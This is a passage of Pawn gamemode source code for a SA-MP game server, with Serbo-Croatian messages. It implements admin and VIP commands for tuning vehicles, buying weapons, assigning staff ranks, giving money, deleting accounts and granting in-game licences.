      	if( PlayerInvited[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes dok si na eventu." );

		PlayerTuningCar[ playerid ] = true;
  		TuningTDControl( playerid, true );
		ShowPlayerDialog( playerid, dialog_TUNING, DIALOG_STYLE_LIST, D_NASLOV, "{4282C0}(1). {FFFFFF}Paintjobs\n{4282C0}(2). {FFFFFF}Colors\n{4282C0}(3). {FFFFFF}Exhausts\n{4282C0}(4). {FFFFFF}Front Bumper\n{4282C0}(5). {FFFFFF}Rear Bumper\n{4282C0}(6). {FFFFFF}Roof\n{4282C0}(7). {FFFFFF}Spoilers\n{4282C0}(8). {FFFFFF}Side Skirts\n{4282C0}(9). {FFFFFF}Wheels\n{4282C0}(10). {FFFFFF}Car Stereo\n{4282C0}(11). {FFFFFF}Hydraulics\n{4282C0}(12). {FFFFFF}Nitro", "Potvrdi", "Odustani" );
  	}
	else SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:fasttune(playerid)
{
	if(PlayerInfo[playerid][xVIPLevel] < 5 && PlayerInfo[playerid][xAdmin] < 1 && PlayerInfo[playerid][xGamemaster] < 1 && PlayerInfo[playerid][xSpecAdmin] < 1 && PlayerInfo[playerid][xPromoter] < 3) return SendErrorMessage(playerid, "Niste ovlasceni.");
	if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Niste u vozilu.");
	if( PlayerInfo[playerid][xWanted] != 0 ) return SendErrorMessage(playerid, "Ne mozete dok imate WL.");
	if(IsVehicleBrod(GetPlayerVehicleID(playerid)) || IsVehicleBajs(GetPlayerVehicleID(playerid)) || IsVehicleMotor(GetPlayerVehicleID(playerid)) || IsVehicleLetelica(GetPlayerVehicleID(playerid))
		|| IsVehiclePrikolica(GetPlayerVehicleID(playerid)) || IsVehicleC1(GetPlayerVehicleID(playerid)) || IsVehicleC2(GetPlayerVehicleID(playerid)) || IsVehicleC3(GetPlayerVehicleID(playerid))) return SendErrorMessage(playerid, "Ne mozete u tom vozilu.");

	AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
	AddVehicleComponent(GetPlayerVehicleID(playerid), 1080);
	AddVehicleComponent(GetPlayerVehicleID(playerid), 1087);

	SendClientMessage(playerid, 0x00FF00FF, "Uzeli ste brzi tuning: nitro 10x, zlatne felge i hidrauliku.");
	GChat(0x00FF00FF, "#FASTTUNE: {FFFFFF}%s {00FF00}je ugradio/la brzi tuning u vozilo (nitro, felge, hidraulika).", ImeIgraca(playerid));
	return 1;
}

CMD:playercc( playerid )
{
	if( PlayerInfo[ playerid ][ xAdmin ] < 1 && PlayerInfo[ playerid ][ xGamemaster ] < 1 && PlayerInfo[ playerid ][ xVIPLevel ] < 2 && PlayerInfo[ playerid ][ xPromoter ] < 3) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	ClearChat( playerid, 18 );
	SendClientMessage(playerid, -1, "PLAYER-CC | Ocistili ste vas chat.");
	SendClientMessage(playerid, 0x4282C0FF, "== "SERVER_WEB" ==");
	return 1;
}

CMD:upoeni( playerid )
{
	if( PlayerInfo[ playerid ][ xUPoen ] > 0 )
	{
	    ShowPlayerDialog( playerid, dialog_ZPOENI, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																							"#\tVrsta\tCijena\n\
																							{FFFFFF}(1).\tVIP Level 1\t{E6CF7E}15 U Poena\n\
																							{FFFFFF}(2).\tVIP Level 2\t{E6CF7E}20 U Poena\n\
																							{FFFFFF}(3).\tVIP Level 3\t{E6CF7E}25 U Poena\n\
																							{FFFFFF}(4).\tLevel UP\t{E6CF7E}10 U Poena", "Odaberi", "Odustani" );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:vipmenu( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 6 || PlayerInfo[ playerid ][ xVIPLevel ] >= 1 )
	{
        if( PlayerInfo[ playerid ][ xVIPLevel ] >= 1 )
		{
            if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes dok si na CS:DM." );
			if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes dok si na trci." );
			if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozes iz auta." );
			if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes da uzmes oruzje dok imas wanted level." );
			if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes da uzmes oruzje dok si u zatvoru." );
		}
		ShowPlayerDialog( playerid, dialog_SELECTVGUN, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																								"- Weapon\tPrice\n\
																								- Shotgun\t[9.500$]\n\
																								- Palica\t[1.000$]\n\
																								- Cvece\t[1.000$]\n\
																								- Deagle\t[7.000$]\n\
																								- 9mm Pistol\t[4.000$]\n\
																								- Uzi\t[9.000$]\n\
																								- MP5\t[9.500$]\n\
																								- M16\t[11.000$]\n\
																								- AK47\t[11.500$]\n\
																								- Pancir\t[12.000$]\n\
																								- Sniper\t[20.000$]", "Potvrdi", "Odustani" );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:makevip( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 || !IsPlayerAdmin(playerid) ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

	new id, kolicina, razlog[ 64 ];
    if( sscanf( params, "uis[64]", id, kolicina, razlog ) ) return SendUsageMessage( playerid, "/makevip [id] [level(0/6)] [razlog]");
	if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
	if( kolicina < 0 || kolicina > 6 ) return SendErrorMessage( playerid, "Pogresan VIP level(0>6).");

	switch(kolicina)
	{
		case 0:
		{
			PlayerInfo[ id ][ xVIPLevel ] = 0;
			PlayerInfo[ id ][ xVipTime ] = 0;
			SCMF( id, 0xFF0000FF, "#VIP: {FFFFFF}Admin {FF0000}%s {FFFFFF}vam je skinuo VIP status.", ImeIgraca( playerid ) );
			SCMF( playerid, 0xFF0000FF, "#VIP: {FFFFFF}Skinuli ste igracu {FF0000}%s {FFFFFF}VIP status.", ImeIgraca( id ) );
		}
		case 1..6:
		{
			PlayerInfo[ id ][ xVIPLevel ] = kolicina;
			PlayerInfo[ id ][ xVipTime ] = gettime();
			SCMF( id, 0x00FF00FF, "#VIP: {FFFFFF}Admin {00FF00}%s {FFFFFF}vam je postavio VIP status, level: {00FF00}(%d).", ImeIgraca( playerid ), kolicina );
			SCMF( playerid, 0x00FF00FF, "#VIP: {FFFFFF}Postavili ste igracu {00FF00}%s {FFFFFF}VIP status, level: {00FF00}(%d).", ImeIgraca( id ), kolicina );
		}
	}
    static q[ 128 ];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `vip_level` = '%d', `vip_time` = '%f' WHERE `user_id` = '%d'", PlayerInfo[ id ][ xVIPLevel ], PlayerInfo[ id ][ xVipTime ], PlayerInfo[ id ][ xID ] );
	mysql_tquery( mSQL, q );

	WriteLog("log-make", "Admin %s | Igrac: %s | Level vipa: %d | Razlog: %s", ImeIgraca( playerid ), ImeIgraca( id ), kolicina, razlog);
	return 1;
}

CMD:makepromoter(playerid, const params[]) 
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 || PlayerInfo[playerid][xSkriptaRank] == 5 || PlayerInfo[playerid][xPromoter] == 4)
    {
		new id, kolicina, razlog[ 64 ];
	    if( sscanf( params, "uis[64]", id, kolicina, razlog ) ) return SendUsageMessage( playerid, "/makepromoter [id] [level(0/4)] [razlog]");
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
		if( kolicina < 0 || kolicina > 4 ) return SendErrorMessage( playerid, "Pogresno level promotera (0/4).");
		if( kolicina == 4 && PlayerInfo[playerid][xAdmin] < 7 ) return SendErrorMessage(playerid, "Ne mozete postaviti vodju promotera, mozete samo obicnog promotera od 1 do 3lvl.");

		switch(kolicina) 
		{
			case 0:
			{
				PlayerInfo[ id ][ xPromoter ] = 0;
				SCMF( id, 0xFF0000FF, "#PROMOTER: {FFFFFF}Admin {FF0000}%s {FFFFFF}vam je skinu%s Promotera.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"));
				SCMF( playerid, 0xFF0000FF, "#PROMOTER: {FFFFFF}Skinuli ste igracu {FF0000}%s {FFFFFF}Promotera.", ImeIgraca( id ) );
			}
			case 1..3:
			{
				PlayerInfo[ id ][ xPromoter ] = kolicina;
				SCMF( id, 0x00FF00FF, "#PROMOTER: {FFFFFF}Admin {00FF00}%s {FFFFFF}vam je postavi%s Promotera {00FF00}(%d).", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina );
				SCMF( playerid, 0x00FF00FF, "#PROMOTER: {FFFFFF}Postavili ste igracu {00FF00}%s {FFFFFF}Promotera {00FF00}(%d).", ImeIgraca( id ), kolicina );
			}
			case 4:
			{
				PlayerInfo[ id ][ xPromoter ] = kolicina;
				SCMF( id, 0x00FF00FF, "#PROMOTER: {FFFFFF}Admin {00FF00}%s {FFFFFF}vam je postavi%s Head Promotera.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
				SCMF( playerid, 0x00FF00FF, "#PROMOTER: {FFFFFF}Postavili ste igracu {00FF00}%s {FFFFFF}Head Promotera.", ImeIgraca( id ) );
			}
		}

	    static q[ 128 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `promoter_level` = '%d' WHERE `user_id` = '%d'", PlayerInfo[ id ][ xPromoter ], PlayerInfo[ id ][ xID ] );
		mysql_tquery( mSQL, q );

		WriteLog("log-make", "Admin %s | Igrac: %s | Promoter: %d | Razlog: %s", ImeIgraca( playerid ), ImeIgraca( id ), kolicina, razlog);
    }
    else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	return 1;
}

CMD:makeyoutuber(playerid, const params[]) 
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 7 || PlayerInfo[playerid][xYouTuber] == 2)
    {
		new id, kolicina, razlog[ 64 ];
	    if( sscanf( params, "ris[64]", id, kolicina, razlog ) ) return SendUsageMessage( playerid, "/makeyoutuber [id] [level(0/2)] [razlog]");
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
		if( kolicina < 0 || kolicina > 2 ) return SendErrorMessage( playerid, "Pogresno level YouTuber (0/2).");
		if( kolicina == 2 && PlayerInfo[playerid][xAdmin] < 7 ) return SendErrorMessage(playerid, "Ne mozete vi davati vodju youtubera, samo obicnog youtubera.");

		switch(kolicina) 
		{
			case 0: 
			{
				PlayerInfo[ id ][ xYouTuber ] = 0;
				SCMF( id, 0xFF0000FF, "#YOUTUBER: {FFFFFF}Admin {FF0000}%s {FFFFFF}vam je skinuo YouTubera.", ImeIgraca( playerid ) );
				SCMF( playerid, 0xFF0000FF, "#YOUTUBER: {FFFFFF}Skinuli ste igracu {FF0000}%s {FFFFFF}YouTubera.", ImeIgraca( id ) );
			}
			case 1 .. 2: 
			{
				PlayerInfo[ id ][ xYouTuber ] = kolicina;
				SCMF( id, 0x00FF00FF, "#YOUTUBER: {FFFFFF}Admin {00FF00}%s {FFFFFF}vam je postavio YouTubera {00FF00}(%d).", ImeIgraca( playerid ), kolicina );
				SCMF( playerid, 0x00FF00FF, "#YOUTUBER: {FFFFFF}Postavili ste igracu {00FF00}%s {FFFFFF}YouTubera {00FF00}(%d).", ImeIgraca( id ), kolicina );
			}
		}

	    static q[ 128 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `xYouTuber` = '%d' WHERE `user_id` = '%d'", PlayerInfo[ id ][ xYouTuber ], PlayerInfo[ id ][ xID ] );
		mysql_tquery( mSQL, q );

		WriteLog("log-make", "Admin %s | Igrac: %s | YouTuber: %d | Razlog: %s", ImeIgraca( playerid ), ImeIgraca( id ), kolicina, razlog);
    }
    else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	return 1;
}

CMD:givemoney( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 && !IsPlayerAdmin(playerid) ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

	new id, kolicina;
    if( sscanf( params, "ui", id, kolicina ) ) return SendUsageMessage( playerid, "/givemoney [id] [novac]");
	if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
	if( kolicina < -100000000 || kolicina > 100000000) return SendErrorMessage(playerid, "Ne mozete ispod 100.000.000$ i preko 100.000.000$.");
 
	AdminMsg( ADM_WARN, "[ADMIN] %s je da%s $%s igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), fNumber(kolicina), ImeIgraca( id ) );

	DajIgracuNovac( id, kolicina );
	SCMF( id, 0x33CCFFFF, "#GIVEMONEY: {FFFFFF}Admin {33CCFF}%s {FFFFFF}vam je dao {33CCFF}($%s).",ImeIgraca( playerid ), fNumber(kolicina));
	SCMF( playerid, 0x33CCFFFF, "#GIVEMONEY: {FFFFFF}Dali ste {33CCFF}%s {FFFFFF}komandom {33CCFF}($%s).",ImeIgraca( id ), fNumber(kolicina));

	WriteLog("log-give", "Admin %s je dao $%d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ));
	return 1;
}

CMD:giveurank( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 && !IsSpecialUser( playerid ) ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

	new id, kolicina;
    if( sscanf( params, "ui", id, kolicina ) )
	{
		SendUsageMessage( playerid, "/giveurank [id] [rank]");
		SendClientMessage(playerid, -1, "1: SKRIPTER | 2: SUVLASNIK | 3: MAPPER | 4: VODJA LIDERA | 5: VODJA PROMOTERA");
		SendClientMessage(playerid, -1, "6: VODJA SPEC TEAMA | 7: VODJA GAMEMASTERA | 8: ORGANIZATOR EVENATA");
		SendClientMessage(playerid, -1, "9: WEB DEVELOPER | 10: WEB ADMINISTRATOR | 11: BETA TESTER | 12: 42O");
		return 1;
	}
	if(id == IPI) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
	if(kolicina < 0 || kolicina > 12) return SendErrorMessage( playerid, "Pogresan broj ranka(0/12)." );

	PlayerInfo[ id ][ xSkriptaRank ] = kolicina;
	sql_user_update_integer( id, "spec_rank", PlayerInfo[ id ][ xSkriptaRank ] );
	SendInfoMessage( playerid, "Postavili ste rank igracu {FFFFFF}%s.", ImeIgraca( id ) );
	SendInfoMessage( id, "{FFFFFF}%s {4282C0}vam je postavio rank.", ImeIgraca( playerid ) );
    return 1;
}

CMD:makeadmin( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 7 || IsSpecialUser(playerid) )
	{
		new id, kolicina;
	    if( sscanf( params, "ri", id, kolicina ) ) return SendUsageMessage( playerid, "/makeadmin [id] [0/7]");
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");

		if( kolicina == 0 )
		{
	        SMG_SetPlayerColor( id );
	        PlayerInfo[ id ][ xAGMStats ] = 0;
			PlayerInfo[ id ][ xAdmin ] = 0;
	        PlayerInfo[ id ][ xSkin ] = SetSexSkin( id );
			PlayerInfo[ id ][ xSpawn ] = SetRandomSpawn( id );
			SMG_SetPlayerSkin( id, SetSexSkin( id ) );
			PlayerInfo[ id ][ xSkriptaRank ] = 0;

			new q[ 180 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `admin_lvl` = '%d', `skin_id` = '%d', `spawn` = '%d', `spec_rank`='0', `xAGMStats` = '0' WHERE `user_id` = '%d'",
									                PlayerInfo[id][xAdmin],
													PlayerInfo[id][xSkin],
													PlayerInfo[id][xSpawn],
													PlayerInfo[id][xID]);

			mysql_tquery( mSQL, q );

			SetPlayerArmour( id, 0 );
			AdminDuty[ id ] = false;

			SCMF( id, -1, "{FF0000}[ ADMIN ]: {FFFFFF}%s %s vam je skinu%s admin poziciju.", getAdminRankName( playerid ), ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
		   	AdminMsg( ADM_WARN, "[ADMIN] %s je skinu%s admin poziciju igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ) );
			WriteLog("log-smjenjivanja", "Admin %s | Igrac: %s | Level Admin: %d", ImeIgraca( playerid ), ImeIgraca( id ), kolicina);

            ALTPoruke[playerid] = true;
		}
		else if( kolicina >= 1 && kolicina <= 7 )
		{
			if( PlayerInfo[ id ][ xAdmin ] < 1 )
			{
				new randkod = 100 + random(899);
				PlayerInfo[ id ][ xAKod ] = randkod;
			}

			new q[500], qq[100];
			format(q, sizeof(q),
				"{4282C0}- Postali ste {FFFFFF}%s {4282C0}od strane {FFFFFF}%s.\n\
				{4282C0}- Admin level: {FFFFFF}%d\n\
				{4282C0}- Admin code: {FFFFFF}%d\n\
				{4282C0}- Nemojte prokockati vasu sansu, sretno!", getAdminRankNamebyRank( kolicina ), ImeIgraca( playerid ), kolicina, PlayerInfo[ id ][ xAKod ]);

			format(qq, sizeof(qq), "{FFFFFF}Promoted - %s:", getAdminRankNamebyRank( kolicina ));
			ShowPlayerDialog(id, 0, DIALOG_STYLE_MSGBOX, qq, q, "Zatvori", "");

			PlayerInfo[ id ][ xAGMStats ] = 0;
			PlayerInfo[ id ][ xAdmin ] = kolicina;

			mysql_format( mSQL, q, 120, "UPDATE `users` SET `admin_lvl` = '%d', `admin_code` = '%d', `xAGMStats` = '0' WHERE `user_id` = '%d'", PlayerInfo[ id ][ xAdmin ], PlayerInfo[ id ][ xAKod ], PlayerInfo[ id ][ xID ] );
    		mysql_tquery( mSQL, q );
    		
			ALTPoruke[playerid] = false;

			WriteLog("log-make", "Admin %s | Igrac: %s | Level Admin: %d", ImeIgraca( playerid ), ImeIgraca( id ), kolicina);
		   	AdminMsg( ADM_WARN, "[ADMIN] %s je postavi%s poziciju %s igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), getAdminRankName( id ), ImeIgraca( id ) );
		}
		else return SendErrorMessage( playerid, "Pogresan level Admina(1-7)." );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	return 1;
}

CMD:makespecadmin( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 7 || PlayerInfo[playerid][xSkriptaRank] == 6) 
    {
		new id, kolicina;
	    if( sscanf( params, "ui", id, kolicina ) ) return SendUsageMessage( playerid, "/makespecadmin [id] [0/1]"); 
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
		if( kolicina == 0 )
		{
	 		PlayerInfo[ id ][ xSpecAdmin ] = 0;
	 		PlayerInfo[ id ][ xAGMStats ] = 0;

		    SMG_SetPlayerColor( id );
	 		sql_user_update_integer( id, "xSpecAdmin", PlayerInfo[ id ][ xSpecAdmin ] );
	 		sql_user_update_integer( id, "xAGMStats", PlayerInfo[ id ][ xAGMStats ] );

			SCMF( id, 0xFF0000FF, "#SPEC ADMIN: %s {FFFFFF}%s {FF0000}vam je skinu%s spec admin poziciju.", getAdminRankName( playerid ), ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );

            ALTPoruke[playerid] = false;
             
		   	AdminMsg( ADM_WARN, "[ADMIN] %s je skinu%s spec admin poziciju igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ) );
		}
		else if( kolicina == 1 )
		{
			PlayerInfo[ id ][ xSpecAdmin ] = 1;
	 		PlayerInfo[ id ][ xAGMStats ] = 0;
	 		PlayerInfo[ id ][ xGamemaster ] = 0;

			sql_user_update_integer( id, "xSpecAdmin", PlayerInfo[ id ][ xSpecAdmin ] );
	 		sql_user_update_integer( id, "xAGMStats", PlayerInfo[ id ][ xAGMStats ] );
	 		sql_user_update_integer( id, "helper_level", PlayerInfo[ id ][ xGamemaster ] );
			
			SCMF( id, 0x00FF00FF, "#SPEC ADMIN: %s {FFFFFF}%s {00FF00}vam je postavi%s spec admin poziciju.", getAdminRankName( playerid ), ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );

			ALTPoruke[playerid] = true;
			 
		   	AdminMsg( ADM_WARN, "[ADMIN] %s je postavi%s spec admin poziciju igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ) );
		}
		else return SendErrorMessage( playerid, "Pogresan level spec admina. (0|1)" );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:makegamemaster( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 7 || PlayerInfo[playerid][xSkriptaRank] == 7) 
    {
		new id, kolicina;
	    if( sscanf( params, "ui", id, kolicina ) )
		{
			SendUsageMessage( playerid, "/makegamemaster [id] [0/2]");
			return 1;
		}
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
		if( kolicina == 0)
		{
		    SMG_SetPlayerColor( id );

	 		PlayerInfo[ id ][ xGamemaster ] = 0;
	 		PlayerInfo[ id ][ xAGMStats ] = 0;
	        PlayerInfo[ id ][ xSkin ] = SetSexSkin( id );
			PlayerInfo[ id ][ xSpawn ] = SetRandomSpawn( id );
			SMG_SetPlayerSkin( id, SetSexSkin( id ) );

			new q[ 180 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `skin_id` = '%d', `spawn` = '%d', `helper_level` = '%d', `xAGMStats` = '0'  WHERE `user_id` = '%d'",
												PlayerInfo[ id ][ xSkin ],
												PlayerInfo[ id ][ xSpawn ],
												PlayerInfo[ id ][ xGamemaster ],
												PlayerInfo[ id ][ xID ] );

			mysql_tquery( mSQL, q );

			SetPlayerArmour( id, 0 );
			AdminDuty[ id ] = false;

			SCMF( id, 0xFF0000FF, "#GAMEMASTER: %s {FFFFFF}%s {FF0000}vam je skinu%s Gamemaster poziciju.", getAdminRankName( playerid ), ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
			WriteLog("log-smjenjivanja", "Admin %s | Igrac: %s | Level Gamemastera: %d", ImeIgraca( playerid ), ImeIgraca( id ), kolicina);
		   	AdminMsg( ADM_WARN, "[ADMIN] %s je skinu%s poziciju gamemastera igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ) );
		}
		else if( kolicina == 1 )
		{
			PlayerInfo[ id ][ xGamemaster ] = kolicina;
			PlayerInfo[ id ][ xAGMStats ] = 0;

			sql_user_update_integer( id, "helper_level", PlayerInfo[ id ][ xGamemaster ] );
			sql_user_update_integer( id, "xAGMStats", PlayerInfo[ id ][ xAGMStats ] );

			SCMF( id, 0x00FF00FF, "#GAMEMASTER: %s {FFFFFF}%s {00FF00}vam je postavi%s Gamemaster 1 poziciju.", getAdminRankName( playerid ), ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
			WriteLog("log-make", "Admin %s | Igrac: %s | Level Gamemastera: %d", ImeIgraca( playerid ), ImeIgraca( id ), kolicina); 
		   	AdminMsg( ADM_WARN, "[ADMIN] %s je postavi%s poziciju Gamemaster 1 igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ) );
		}
		else if( kolicina == 2 )
		{
			PlayerInfo[ id ][ xGamemaster ] = kolicina;
			PlayerInfo[ id ][ xAGMStats ] = 0;

			sql_user_update_integer( id, "helper_level", PlayerInfo[ id ][ xGamemaster ] );
			sql_user_update_integer( id, "xAGMStats", PlayerInfo[ id ][ xAGMStats ] );

			SCMF( id, 0x00FF00FF, "#GAMEMASTER: %s {FFFFFF}%s {00FF00}vam je postavi%s Gamemaster 2 poziciju.", getAdminRankName( playerid ), ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
			WriteLog("log-make", "Admin %s | Igrac: %s | Level Gamemastera: %d", ImeIgraca( playerid ), ImeIgraca( id ), kolicina);
		   	AdminMsg( ADM_WARN, "[ADMIN] %s je postavi%s poziciju Gamemaster 2 igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ) );
		}
		else return SendErrorMessage( playerid, "Pogresan level Gamemastera(0/3)." );
    } 
    else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	return 1;
}

CMD:promenipol( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 5 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    //if( PlayerInfo[ playerid ][ xAdmin ] <= 5 && !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );
	
	new id, kolicina;
	if( sscanf( params, "ui", id, kolicina ) )
	{
		SendUsageMessage( playerid, "/promenipol [id] [pol(id)]");
     	SendClientMessage( playerid, -1, "[POL] 1: Muski | 2: Zenski");
     	return 1;
	}
	if( kolicina == 1 )
	{
	    PlayerInfo[ id ][ xPol ] = 1;
	    sql_user_update_integer( id, "sex", PlayerInfo[ id ][ xPol ] );
     	SCMF( playerid, 0x33CCFFFF, "#POL: {FFFFFF}Promenili ste igracu {33CCFF}%s {FFFFFF}pol na musko.", ImeIgraca( id ) );
     	return 1;
	}
	else if( kolicina == 2 )
	{
	    PlayerInfo[ id ][ xPol ] = 2;
		sql_user_update_integer( id, "sex", PlayerInfo[ id ][ xPol ] );
     	SCMF( playerid, 0x33CCFFFF, "#POL: {FFFFFF}Promenili ste igracu {33CCFF}%s {FFFFFF}pol na zensko.", ImeIgraca( id ) );
     	return 1;
	}
	else
	{
		SendUsageMessage( playerid, "/promenipol [id] [pol(id)]");
     	SendClientMessage( playerid, -1, "[POL] 1: Muski | 2: Zenski");
	}
	return 1;
}

CMD:deleteacc( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    //if( PlayerInfo[ playerid ][ xAdmin ] <= 7 && !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );

	new imeigraca[ MAX_PLAYER_NAME ];
	if( sscanf( params, "s[24]", imeigraca ) ) return SendUsageMessage( playerid, "/deleteacc [nickname]");

    if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) )
	{
		new id = GetPlayerIdFromName( imeigraca );

		PlayerLogged[ id ] = false;

		CheckDeleteProperty( id );

		WriteLog("log-delete", "Igracu %s je obrisan nalog od admina %s", ImeIgraca( id ), ImeIgraca( playerid ));

		new q[128];
		mysql_format( mSQL, q, sizeof( q ), "DELETE FROM `users` WHERE `user_id` = '%d' LIMIT 1", PlayerInfo[ id ][ xID ] );
		mysql_tquery( mSQL, q );
 
		AdminMsg( ADM_WARN, "[ADMIN] %s je obrisa%s account %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ) );

		SendClientMessage( id, 0xFF0000FF, "#DELETE: {FFFFFF}Tvoj nalog je obrisan sa servera." );
		SetPlayerTimerEx(id, "KickIgraca", 100, false, "i", id);
    }
	else
	{
	    new query[ 130+MAX_PLAYER_NAME ];
		mysql_format( mSQL, query, sizeof(query), "SELECT `property_id_1`, `property_id_2`, `property_id_3`, `bussines_id` FROM `users` WHERE `p_name` = '%e' LIMIT 1", imeigraca );
		mysql_tquery( mSQL, query, "CheckPlayerRemoveAcc", "is", playerid, imeigraca );
	}
   	return 1;
}

CMD:adajdozvolu( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 5 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    //if( PlayerInfo[ playerid ][ xAdmin ] <= 5 && !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );

	new item[ 32 ], id;
	if( sscanf( params, "s[32]u", item, id ) )
	{
		SendUsageMessage( playerid, "/adajdozvolu [kategorija] [id]");
     	SendClientMessage( playerid, -1, "[Kategorije] kopno, voda, zrak, oruzje, all");
		return 1;
	}
	if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID." );

	if( strcmp( item, "kopno", true ) == 0 )
	{
		PlayerInfo[ id ][ xVozacka ] = 1;
		sql_user_update_integer( id, "vehicle_license", PlayerInfo[ id ][ xVozacka ] );
		SendInfoMessage( playerid, "Dali ste dozvolu za kopnenu voznju igracu %s.", ImeIgraca( id ) );
		SendInfoMessage( id, "Admin %s vam je dao dozvolu za kopnenu voznju.", ImeIgraca( playerid ) );
	}
	else if( strcmp( item, "voda", true ) == 0 )
	{
		PlayerInfo[ id ][ xBrodska ] = 1;
		sql_user_update_integer( id, "boat_license", PlayerInfo[ id ][ xBrodska ] );
		SendInfoMessage( playerid, "Dali ste dozvolu za vodenu voznju igracu %s.", ImeIgraca( id ) );
		SendInfoMessage( id, "Admin %s vam je dao dozvolu za vodenu voznju.", ImeIgraca( playerid ) );
	}
	else if( strcmp( item, "zrak", true ) == 0 )
	{
		PlayerInfo[ id ][ xLetelica ] = 1;
		sql_user_update_integer( id, "air_license", PlayerInfo[ id ][ xLetelica ] );
		SendInfoMessage( playerid, "Dali ste dozvolu za zracnu voznju igracu %s.", ImeIgraca( id ) );
		SendInfoMessage( id, "Admin %s vam je dao dozvolu za zracnu voznju.", ImeIgraca( playerid ) );
	}
	else if( strcmp( item, "oruzje", true ) == 0 )
	{
		PlayerInfo[ id ][ xGunLicense ] = 1;
		sql_user_update_integer( id, "gun_license", PlayerInfo[ id ][ xGunLicense ] );
